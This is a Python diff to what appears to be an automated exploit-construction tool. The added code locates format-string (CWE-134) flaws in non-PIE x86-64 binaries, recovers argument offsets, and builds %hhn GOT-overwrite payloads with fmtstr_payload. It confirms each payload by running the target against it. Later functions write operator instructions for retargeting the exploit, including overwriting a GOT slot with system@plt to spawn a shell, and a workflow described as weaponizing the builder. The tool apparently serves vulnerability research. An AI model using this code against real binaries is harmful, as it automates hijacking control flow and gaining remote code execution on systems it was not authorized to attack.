@@ -27,6 +27,7 @@ probe-first recipe."""
 from __future__ import annotations
 
 import logging
+import re
 from typing import Optional
 
 from ... import observe
@@ -349,6 +350,86 @@ def _function_ir(conn, target_id, faddr):
     return None
 
 
+def _function_frame(conn, target_id, faddr):
+    """The decompiler-recovered stack frame for a function ({frame_size, vars:[{name,offset,...}]}),
+    or None. The companion to _function_ir for the static (no-execution) offset path."""
+    from ...db.dao import FunctionDAO
+    fd = FunctionDAO(conn)
+    try:
+        want = int(faddr, 16) if isinstance(faddr, str) else int(faddr)
+    except (TypeError, ValueError):
+        return None
+    for f in fd.list_by_target(target_id):
+        try:
+            a = int(f.addr, 16) if isinstance(f.addr, str) else int(f.addr)
+        except (TypeError, ValueError):
+            continue
+        if a == want:
+            full = fd.get(f.id)
+            return getattr(full, "frame", None) if full else None
+    return None
+
+
+def _static_layout_from_frame(ir, frame, site_addr, fname: str) -> Optional[dict]:
+    """doc 58 non-runnable path: recover the printf arg offset with NO execution when the decompiler
+    symbolized the stack local (so the numeric displacement is hidden from the instruction text).
+    The frame map carries what the text lost -- the local's rbp-relative offset and the frame size.
+
+    `buf` at rbp+offset with rsp = rbp - frame_size sits at rsp + (frame_size + offset); its 1-based
+    varargs position is `first_stack + (that disp)/8`. Returns a `kind:"stack"` layout (same shape
+    `plan_format_write` consumes) or None. x86-64 SysV."""
+    k = FMT_ARG_INDEX.get(fname)
+    if k is None or not frame:
+        return None
+    try:
+        fsize = int(frame.get("frame_size") or 0)
+        variables = frame.get("vars") or []
+    except (AttributeError, TypeError):
+        return None
+    if fsize <= 0 or not variables:
+        return None
+    instrs = x64frame.instructions(ir)
+    idx = x64frame.site_index(instrs, site_addr)
+    if idx is None:
+        return None
+    reg = x64frame.ARG_REGS[k]
+    before = [t for _, t in instrs[:idx]]
+    # NB: no arg-register check here. The lead is already a confirmed non-literal format sink, and a
+    # STACK-based %hhn write (arg offset in the varargs STACK window, not a register) is unaffected
+    # by whatever sits in rsi/rdx -- the crude "a later reg is written" test false-rejects common
+    # surrounding code (e.g. `lea rdx,[buf]` emitted for a `buf[n]=0` null-termination).
+    deft = x64frame.defining_text(before, reg)
+    if not deft or x64frame._split(deft)[0] != "lea" or "[" not in deft:
+        return None
+    inner = deft[deft.find("[") + 1:deft.rfind("]")].strip()
+    off = None
+    m = re.search(r"\brbp\b\s*([+-])\s*(0x[0-9a-fA-F]+|\d+)", inner)   # literal rbp-relative
+    if m:
+        off = (1 if m.group(1) == "+" else -1) * int(m.group(2), 0)
+    else:
+        nm = re.match(r"([A-Za-z_.$][\w.$]*)", inner)                 # symbolized local -> frame map
+        if nm:
+            for v in variables:
+                if isinstance(v, dict) and v.get("name") == nm.group(1):
+                    try:
+                        off = int(v.get("offset"))
+                    except (TypeError, ValueError):
+                        off = None
+                    break
+    if off is None:
+        return None
+    disp = fsize + off                                   # the local's byte displacement above rsp
+    if disp < 0:
+        return None
+    first = 6 - k
+    pad = (-disp) % 8
+    return {"func": fname, "fmt_reg": reg, "first_stack": first, "kind": "stack",
+            "arg_offset": first + (disp + pad) // 8, "pad": pad, "buf_disp": disp,
+            "frame": fsize, "loop": x64frame.in_loop(instrs, idx),
+            "after": x64frame.calls_after(instrs, idx), "site": instrs[idx][0],
+            "reader": None, "cap": None, "_static_frame": True}
+
+
 def _sink_name(ir, site_addr) -> Optional[str]:
     instrs = x64frame.instructions(ir)
     k = x64frame.site_index(instrs, site_addr)
@@ -361,13 +442,125 @@ def _already_exploited(conn, target) -> bool:
                for f in FindingDAO(conn).list_by_target(target.id))
 
 
+def _fmt_repro(target, layout: dict, plan: dict, win) -> str:
+    """The lightweight, operator-runnable deliverable (doc 58: a PoC is a script/payload + a few
+    lines, not a package). The exact payload bytes are the stored poc-input artifact; this says what
+    they do and how to fire them."""
+    name = getattr(target, "filename", None) or "./target"
+    writes = ", ".join(f"{a:#x} := {v:#x}" for a, v in (plan.get("writes") or {}).items())
+    winname = (win[0] if win else "the win function")
+    return (f"# CWE-134 format-string write-what-where ({plan['target_level']})\n"
+            f"# No PIE: every address is literal. arg_offset={layout.get('arg_offset')}, "
+            f"%hhn write(s): {writes}\n"
+            f"# The {len(plan['input'])}-byte payload is the attached poc-input artifact "
+            f"(save as poc.bin).\n"
+            f"{name} < poc.bin      # the next call through the overwritten GOT slot enters "
+            f"{winname}\n")
+
+
+def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: bytes, specs=None):
+    """doc 58 fallback: when the static frame recovery cannot place the format buffer (e.g. the
+    decompiler symbolized the stack local, so the numeric offset is hidden) BUT the target can run
+    here, recover the arg offset with the %p probe, then CONFIRM a GOT-overwrite-to-win by
+    detonation. `specs` is the ranked (mode, env_name) input channels to try -- the format string
+    is not always read from stdin. Returns a dict {payload, slot, got, off, win, mode, env_name} on
+    a confirmed hijack, else None. x86-64 / no-PIE only; detonation makes it poc-backed."""
+    if not (win and win[1]):
+        return None
+    from . import channels as _channels, detonate, elfstatic, rop
+    try:
+        if elfstatic.is_pie(target_bytes):
+            return None
+        # stage into an EXEC-capable scratch dir -- the content store keeps artifacts non-exec
+        staged = ctx.scratch() / "fmt-construct" / (getattr(target, "filename", None) or "target.bin")
+        staged.parent.mkdir(parents=True, exist_ok=True)
+        ctx.content.stage_target(target, staged.parent, staged.name)
+        staged.chmod(0o755)
+        exe = str(staged)
+        scratch_dir = str(staged.parent)
+    except Exception:                                    # noqa: BLE001
+        return None
+    specs = specs or [("stdin", None)]
+    # Recover the arg offset on whichever channel actually carries the format string: %p must print
+    # our 0x41.. marker, which only happens when the buffer is read from the channel we deliver on.
+    chan = None
+    for mode, env_name in specs:
+        off = detonate.probe_fmt_offset(exe, input_mode=mode, env_name=env_name,
+                                        scratch_dir=scratch_dir)
+        if off is not None:
+            chan = (mode, env_name, off)
+            break
+    if chan is None:
+        return None
+    mode, env_name, off = chan
+    try:
+        got = rop.got_entries(target_bytes)
+    except Exception:                                    # noqa: BLE001
+        got = {}
+    if not got:
+        return None
+    # candidate GOT slots: functions called after the sink first, then any import but the sink/sentinels
+    after = []
+    try:
+        site_i = lead.site_addr if isinstance(lead.site_addr, int) else int(str(lead.site_addr), 0)
+        instrs = x64frame.instructions(ir)
+        after = x64frame.calls_after(instrs, x64frame.site_index(instrs, site_i)) or []
+    except Exception:                                    # noqa: BLE001
+        after = []
+    ordered = [c for c in after if c in got and c not in _NOT_TARGET and c != fname]
+    ordered += [g for g in got if g not in ordered and g not in _NOT_TARGET and g != fname]
+    win_vaddr = int(win[1])
+    for slot in ordered:
+        try:
+            payload = fmt.fmtstr_payload(off, {got[slot]: win_vaddr}, nbytes=6)
+        except Exception:                                # noqa: BLE001
+            continue
+        if detonate.reaches_address(exe, payload, win_vaddr, input_mode=mode, env_name=env_name,
+                                    scratch_dir=scratch_dir):
+            return {"payload": payload, "slot": slot, "got": got[slot], "off": off, "win": win,
+                    "mode": mode, "env_name": env_name}
+    return None
+
+
+def _try_detonate(ctx, target, plan: dict, win, specs=None):
+    """Best-effort bonus confirmation: if the target can run here, verify control reaches the win
+    address when the payload is delivered on one of `specs` (the ranked input channels) ->
+    (True, signal, mode, env_name). Never required; a sound construction stands on its argument
+    alone. Returns (False, None, None, None) when the target cannot run or no channel reaches."""
+    try:
+        from . import detonate
+    except Exception:                                    # noqa: BLE001
+        return (False, None, None, None)
+    try:
+        win_vaddr = int(win[1]) if win and win[1] else None
+        if win_vaddr is None or not plan.get("input"):
+            return (False, None, None, None)
+        from . import elfstatic
+        tb = ctx.content.path(target.sha256).read_bytes()
+        if elfstatic.is_pie(tb):                          # win_vaddr is a file vaddr; PIE needs a base
+            return (False, None, None, None)
+        # stage into an EXEC-capable dir -- the content store keeps artifacts non-exec
+        staged = ctx.scratch() / "fmt-construct" / (getattr(target, "filename", None) or "target.bin")
+        staged.parent.mkdir(parents=True, exist_ok=True)
+        ctx.content.stage_target(target, staged.parent, staged.name)
+        staged.chmod(0o755)
+        scratch_dir = str(staged.parent)
+        for mode, env_name in (specs or [("stdin", None)]):
+            if detonate.reaches_address(str(staged), bytes(plan["input"]), win_vaddr,
+                                        input_mode=mode, env_name=env_name, scratch_dir=scratch_dir):
+                return (True, f"control reached {win[0]} ({win_vaddr:#x})", mode, env_name)
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "fmt detonation skipped")
+    return (False, None, None, None)
+
+
 def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[bytes] = None,
                               max_sites: int = 3) -> list:
     """For each CWE-134 lead with a recoverable site, compute the %hhn plan and file it as a
     corroborated recipe carrying the payload bytes. Returns the filed finding ids ([] when there is
     no CWE-134 lead, the target is not x86-64, or a format exploit is already demonstrated).
     Never raises."""
-    from . import exploit, recipe
+    from . import channels, construct, exploit, recipe
     fids = []
     try:
         if not _x86_64(target) or _already_exploited(ctx.conn, target):
@@ -382,6 +575,8 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
         except Exception:                                # noqa: BLE001
             edges = None
+        # input channels the format string may be read from, highest-signal first (not just stdin).
+        specs = channels.delivery_specs(ctx, target)
         win = exploit.find_win(exploit.elf_functions(target_bytes), call_edges=edges)
         win = win if win and win[0] else None
         done = 0
@@ -393,35 +588,202 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                 continue
             name = _sink_name(ir, lead.site_addr)
             layout = format_layout(ir, lead.site_addr, name or "")
+            # doc 58 non-runnable path: when the static instruction text can't place the format
+            # buffer (symbolized local), recover the offset from the frame map -- no execution.
+            if not (layout and layout.get("kind") == "stack") and name:
+                frame = _function_frame(ctx.conn, target.id, lead.function_addr)
+                fl = _static_layout_from_frame(ir, frame, lead.site_addr, name)
+                if fl:
+                    layout = fl
             plan = plan_format_write(target_bytes, layout, win=win) if layout else None
             # Emit a standalone exploit SCRIPT (the operator-runnable deliverable): a write-what-where
             # when a plan exists, else a leak-only PoC -- a format string is always at least an info
             # leak. Best-effort, keyed to the site; never blocks the recipe below.
             if layout:
                 _emit_format_script(ctx, target, target_bytes, layout, plan, name)
+            # doc 58: if the static construction isn't a complete one-shot but the target RUNS,
+            # recover the offset by probe and CONFIRM a GOT-overwrite-to-win by detonation.
+            if not (plan and plan.get("stage") == "one-shot"):
+                dyn = _construct_by_probe(ctx, target, ir, lead, name, win, target_bytes, specs)
+                if dyn:
+                    done += 1
+                    try:
+                        s = f"{int(str(lead.site_addr), 0):#x}"
+                    except (ValueError, TypeError):
+                        s = str(lead.site_addr)
+                    _mode, _env = dyn.get("mode", "stdin"), dyn.get("env_name")
+                    _binname = getattr(target, 'filename', None) or './target'
+                    _where = channels.channel_phrase(_mode, _env)
+                    _deliver = channels.deliver_line(_mode, _binname, _env)
+                    fid = construct.record_constructed_poc(
+                        ctx, target, cwe="CWE-134",
+                        technique=f"format-string %hhn GOT overwrite ({dyn['slot']}@GOT := {win[0]})",
+                        level="L3", payload=dyn["payload"],
+                        soundness=[
+                            f"{name}(buf) at {s}: a run-time buffer is the format with zero format "
+                            "arguments (the CWE-134 shape)",
+                            f"the format string is read from {_where}",
+                            f"arg offset {dyn['off']} recovered by %p probe (the 0x41.. marker "
+                            f"printed at that varargs position)",
+                            f"no PIE: {dyn['slot']}@GOT is at the fixed address {dyn['got']:#x}",
+                            f"%hhn write {dyn['slot']}@GOT := &{win[0]} ({int(win[1]):#x})",
+                            f"DETONATED: control reached {win[0]} ({int(win[1]):#x}) under the "
+                            "payload; benign input does not",
+                        ],
+                        reproduce=(f"# CWE-134 format-string GOT overwrite -> {win[0]} (L3)\n"
+                                   f"# {dyn['slot']}@GOT({dyn['got']:#x}) := &{win[0]}"
+                                   f"({int(win[1]):#x}) via %hhn at arg offset {dyn['off']}.\n"
+                                   f"# payload (read from {_where}) is the attached poc-input artifact "
+                                   f"({len(dyn['payload'])} bytes); save as poc.bin\n"
+                                   f"{_deliver}"),
+                        input_mode=_mode, detector="fmt_construct",
+                        dedup_key=f"poc:CWE-134:fmt-write:{s}:{target.id}",
+                        title=f"Format-string write-what-where at {s}",
+                        summary=f"{name}(buf) at {s}: %hhn-write &{win[0]} over {dyn['slot']}@GOT "
+                                f"({dyn['got']:#x}); control reach to {win[0]} confirmed by detonation",
+                        lead=lead, detonated=True,
+                        extra_evidence=_fmt_customize(
+                            target, target_bytes, arg_offset=dyn["off"],
+                            slot_name=f"{dyn['slot']}@GOT", slot_addr=dyn["got"],
+                            value=int(win[1]), win_name=win[0], sink_name=name, site=s),
+                        function_addr=getattr(lead, "function_addr", None),
+                        site_addr=getattr(lead, "site_addr", None),
+                        signal_name=f"control reached {win[0]} ({int(win[1]):#x})")
+                    if fid:
+                        fids.append(fid)
+                    continue
             if not plan:
                 continue
             done += 1
             site = f"{layout['site']:#x}"
+            # doc 58: the one-shot branch is a COMPLETE construction -- every fact is literal (no
+            # PIE so the GOT slot is absolute, the arg offset is the recovered frame, a GOT slot
+            # called after the sink). That is a PoC, not a recipe: file it as a CONFIRMED,
+            # constructed PoC carrying the payload + a lightweight repro. The probe/two-stage
+            # branches rest on an unproven fact (an offset to probe, a base to leak) and stay
+            # honest corroborated recipes below.
+            if plan.get("stage") == "one-shot" and plan.get("input"):
+                detonated, signal_name, det_mode, det_env = _try_detonate(ctx, target, plan, win, specs)
+                # record the channel detonation actually used; else keep stdin (the static plan's
+                # documented default -- without a run we cannot know which channel is read).
+                one_mode = det_mode if detonated else "stdin"
+                w_addr, w_val = next(iter((plan.get("writes") or {}).items()), (None, None))
+                custom = (_fmt_customize(target, target_bytes, arg_offset=layout.get("arg_offset"),
+                          slot_name=_got_name(target_bytes, w_addr), slot_addr=w_addr, value=w_val,
+                          win_name=(win[0] if win else "the target"), sink_name=name, site=site)
+                          if w_addr is not None else None)
+                fid = construct.record_constructed_poc(
+                    ctx, target, cwe="CWE-134", technique=plan["technique"],
+                    level=plan["target_level"], payload=plan["input"],
+                    soundness=list(plan["assumptions"]),
+                    reproduce=_fmt_repro(target, layout, plan, win),
+                    input_mode=one_mode, detector="fmt_construct",
+                    dedup_key=f"poc:CWE-134:fmt-write:{site}:{target.id}",
+                    title=f"Format-string write-what-where at {site}",
+                    summary=plan["summary"], lead=lead, extra_evidence=custom,
+                    function_addr=getattr(lead, "function_addr", None),
+                    site_addr=getattr(lead, "site_addr", None),
+                    detonated=detonated, signal_name=signal_name)
+                if fid:
+                    fids.append(fid)
+                continue
             extra = [{"channel": "recipe-assumptions",
                       "detail": "; ".join(plan["assumptions"])}]
             if plan.get("writes"):
                 extra.append({"channel": "recipe-plan", "detail": (
                     f"arg_offset={layout.get('arg_offset')} pad={layout.get('pad')} writes="
                     + ", ".join(f"{a:#x}<-{v:#x}" for a, v in plan["writes"].items()))})
+            # The precise technique to build next for THIS plan -- more specific than the per-class
+            # default. The single-shot case is the fmtpie narrow-read wall (the sink runs once, so a
+            # %p leak cannot precede the %hhn write in one run); the two-stage/probe plans are
+            # computed and only need detonation / offset recovery.
+            stage = plan.get("stage")
+            if stage == "offset-only":
+                _tech = ("a format sink reached MORE THAN ONCE (a looping/menu sink) so a %p "
+                         "leak can precede the %hhn write -- a single-shot sink cannot leak-"
+                         "then-write in one run, and under PIE the write target needs the leak")
+            elif stage == "two-stage":
+                _tech = ("a runnable target to detonate the two-stage %p-leak-then-%hhn plan "
+                         "(the leak indices and the saved-return write are computed) -- or, for "
+                         "a narrow-read sink, a wider/multi-read leak to anchor the live frame")
+            else:                                        # probe / other
+                _tech = ("a runnable target to recover the format-arg offset by %p probe -- the "
+                         "GOT write target and value are already computed")
             fid = recipe.file_recipe(
                 ctx, target, cwe="CWE-134", technique=plan["technique"],
                 target_level=plan["target_level"], severity="high", detector="fmt_recipe",
                 dedup_key=f"recipe:CWE-134:fmt-write:{site}:{target.id}",
                 title=f"Exploitation recipe: {plan['technique']} at {site}",
                 summary=plan["summary"], steps=plan["steps"], why_not_executed=why,
-                lead=lead, extra_evidence=extra,
+                lead=lead, extra_evidence=extra, missing_technique=_tech,
                 input_bytes=plan["input"] or None, input_mode="stdin")
             if fid:
                 fids.append(fid)
     except Exception:                                    # noqa: BLE001 -- advisory, never fatal
         observe.absorbed(_log, "format-write recipe not filed")
     return fids
+
+
+def _fmt_customize(target, target_bytes, *, arg_offset, slot_name, slot_addr, value,
+                   win_name, sink_name, site) -> list:
+    """Evidence that shows the operator HOW TO RETARGET this format-string PoC: the knobs they can
+    change (write target / value / offset) with the RCE recipe, plus the editable builder script."""
+    sysplt = None
+    try:
+        sysplt = (elfstatic.plt_stubs(target_bytes) or {}).get("system")
+    except Exception:                                    # noqa: BLE001
+        pass
+    rce = ("overwrite a GOT slot that the program calls with YOUR input as its first argument "
+           "with system@plt" + (f" ({sysplt:#x})" if sysplt else " (resolve its address)")
+           + ", then send your command (e.g. '/bin/sh') as the program's input.")
+    guide = (
+        f"This PoC does a %hhn write-what-where: it overwrites {slot_name} ({slot_addr:#x}) with "
+        f"&{win_name} ({value:#x}), so the next call through that slot redirects control. "
+        "Edit these knobs in the builder below to change the effect:\n"
+        f"- WRITE VALUE ({value:#x}) — the address control jumps to; set it to any function's "
+        "address to call that instead.\n"
+        f"- WRITE TARGET ({slot_name} @ {slot_addr:#x}) — the GOT slot overwritten; pick one the "
+        "program calls after the sink.\n"
+        f"- ARG OFFSET ({arg_offset}) — where your bytes land in the varargs; fixed for this binary.\n"
+        f"- RCE / spawn a shell — {rce}"
+    )
+    binname = getattr(target, "filename", "the_binary")
+    usage = (
+        "WHAT IT IS — a self-contained builder script, not just the raw bytes. It runs the target to "
+        "self-calibrate the stack offset, proves the format string is attacker-controlled (an info "
+        "leak), then writes the payload file. Nothing to guess.\n"
+        "WORKFLOW —\n"
+        "1. Download the builder (`poc.py`) below.\n"
+        f"2. Run it on the binary: `python3 poc.py ./{binname}` — writes `fmt_write.bin`.\n"
+        f"3. Deliver the payload: `./{binname} < fmt_write.bin` — triggers the effect.\n"
+        f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder on "
+        "the compiled binary. The Code view shows WHERE the bug is; the builder is HOW to weaponize it."
+    )
+    ev = [{"channel": "builder-usage", "detail": usage},
+          {"channel": "customize", "detail": guide}]
+    try:
+        from . import exploit_script
+        facts = {"cwe": "CWE-134", "sink": sink_name or "printf",
+                 "source": f"{getattr(target, 'filename', 'target')} ({sink_name}() at {site})",
+                 "delivery": "stdin", "argv": [], "bits": int(getattr(target, "bits", 64) or 64),
+                 "exec_name": getattr(target, "filename", "./target"), "arg_offset": arg_offset,
+                 "write_target": {"name": slot_name, "addr": int(slot_addr), "value": int(value)},
+                 "mitigations": {"pie": False, "relro": "partial"}}
+        ev.append({"channel": "exploit-script", "detail": exploit_script.render_format_string_exploit(facts)})
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "editable exploit builder not rendered")
+    return ev
+
+
+def _got_name(target_bytes, addr) -> str:
+    try:
+        from . import rop
+        for n, a in (rop.got_entries(target_bytes) or {}).items():
+            if a == addr:
+                return f"{n}@GOT"
+    except Exception:                                    # noqa: BLE001
+        pass
+    return "GOT slot"
 
 
 def _emit_format_script(ctx, target, target_bytes, layout, plan, sink) -> Optional[str]:
